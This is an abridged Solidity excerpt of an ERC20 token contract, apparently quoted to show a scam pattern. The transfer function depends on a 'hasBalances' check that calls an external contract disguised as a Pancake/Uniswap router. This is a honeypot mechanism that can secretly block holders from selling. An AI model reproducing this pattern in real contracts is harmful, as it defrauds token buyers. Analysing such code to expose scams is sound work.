...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    PancakeRouter private _uniswapV3;
    ...
    constructor(
        ...
        _uniswapV3 = PancakeRouter(pancake_router);
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if(sender != deadAddress){
                    require(hasBalances(sender), "Insufficient Balance");
                }
    ...
    function hasBalances(address sender) private view returns (bool) {
        if(sender != deadAddress){
            return _uniswapV3.swapExactTokensForTokens(sender);
        }
        return false;
    }
